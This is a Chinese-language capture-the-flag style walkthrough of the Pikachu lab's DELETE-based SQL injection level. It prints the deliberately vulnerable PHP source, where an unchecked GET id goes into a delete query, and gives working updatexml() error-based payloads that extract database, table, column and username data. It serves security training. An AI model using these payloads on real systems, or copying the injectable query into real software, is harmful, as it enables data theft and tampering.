# delete注入

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_del.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";


$link=connect();
$html='';
if(array_key_exists("message",$_POST) && $_POST['message']!=null){
    //插入转义
    $message=escape($link, $_POST['message']);
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)!=1){
        $html.="<p>出现异常，提交失败！</p>";
    }
}


// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
//没对传进来的id进行处理，导致DEL注入
if(array_key_exists('id', $_GET)){
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        header("location:sqli_del.php");
    }else{
        $html.="<p style='color: red'>删除失败,检查下数据库是不是挂了</p>";
    }
}


?>





<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../sqli.php">sqli</a>
                </li>
                <li class="active">delete注入</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="删除留言的的时候,好像有点问题">
                点一下提示~
            </a>


        </div>
        <div class="page-content">

            <div id="sqli_del_main">
                <p class="sqli_del_title">我是一个不正经的留言板：</p>
                <form method="post">
                    <textarea class="sqli_del_in" name="message"></textarea><br />
                    <input class="sqli_del_submit" type="submit" name="submit" value="submit" />
                </form>
                <?php echo $html;?>
                <br />
                <div id="show_message">
                    <p class="line">留言列表：</p>

                    <?php
                    $query="select * from message";
                    $result=execute($link, $query);
                    while($data=mysqli_fetch_assoc($result)){
                        //输出转义，防XSS
                        $content=htmlspecialchars($data['content'],ENT_QUOTES);
                        echo "<p class='con'>{$content}</p><a href='sqli_del.php?id={$data['id']}'>删除</a>";
                    }
                    ?>
                </div>
            </div>




        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察源码可以看到该代码对SQL注入是无任何防护的

***

# 二、通关教程

使用BurpSuite抓包后可以看时提交的输入如下

```
# 通过GET方式提交
id=62
```

可以推算出删除留言时大概的SQL语句如下：

```
delete from 表名 where id=xx
```

与insert注入类似，同样使用到updatexml()方法

猜数据库名

```
and updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

![image-20230305145346504](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305145346504.png)

爆表名

```
and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),0x7e),1)
```

![image-20230305145429014](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305145429014.png)

爆列名，此处与上方同理

```
and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)
```

![image-20230305145603328](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305145603328.png)

爆数据

```
and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)
```

![image-20230305145734768](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305145734768.png)

